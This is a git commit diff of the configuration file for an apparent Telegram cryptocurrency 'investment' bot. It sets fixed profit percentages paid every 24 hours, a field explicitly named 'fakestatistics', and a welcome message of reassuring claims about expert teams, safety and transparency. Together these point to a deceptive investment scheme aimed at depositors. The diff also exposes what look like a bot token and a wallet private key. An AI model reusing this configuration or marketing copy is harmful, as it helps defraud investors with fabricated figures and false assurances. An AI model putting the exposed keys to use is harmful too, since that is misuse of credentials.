f550e33579d653d583c5ac379c20a7e1eda14974
Kvara777 <128314779+Kvara777@users.noreply.github.com>
2023-07-18 17:19:04 +0200

    Update details.js

--- details.js
+++ details.js
@@ -1,14 +1,14 @@
 module.exports={
-    token:"61117765]isQz4jTCnRB9LG47b0ePWunyQsH4",
+    token:"6386885899:AAGDgCOymj9ZZz5UpvCbQb7ugfbzlnrJ3y8",
     mongo_url:"mong:roryWrites=true&w=majority",
-    admins:[5908965726],
+    admins:[787953355],
     curr:"USDT",
     lvl:[10,5,3],
     profit_percent:[1.3,1.8,2.3],
     minAmount:[50,500,1000],
     daily_hour:[24,24,24],
     fakestatistics:{totalUsers:0,totalDeposits:0,totalInvests:0,totalWithdrawals:0},
-    PrivateKey:"d1f56dca4d947f797afe6032ab2e8bc5bee60a33e11199be1211ca8c0",
-Address:"0x90af8610ed4bd3df70d8c861145b6b5f6e5e",
+    PrivateKey:"0x23d8293538ddc0155776b88e4e50f88cdc60d8492d08036c7497ea61c937de68",
+Address:"0xF49Ec78215Ba81216d6919b47f80aA1f938B935A",
     appname:"https://bozip.onreder.com",
     aboutmsg:"👋 Welcome to our investment platform! \n We are a team of financial experts and investment professionals who have created a platform to make investing in cryptocurrencies easy and profitable for you. 💰💹\n\nOur platform ensures the safety and security of your investments and personal information, utilizing the latest security measures. We believe in honesty and transparency, providing regular updates and information on your portfolio's performance. 📊\n\nInvesting can be complex, especially in the world of cryptocurrencies. That's why we have a team of knowledgeable experts available to support you at every stage of your investment journey. We welcome all questions and concerns and are dedicated to helping you succeed in your financial goals. 💪\n\nThank you for choosing us. We are excited to embark on this investment journey with you! 🚀"}
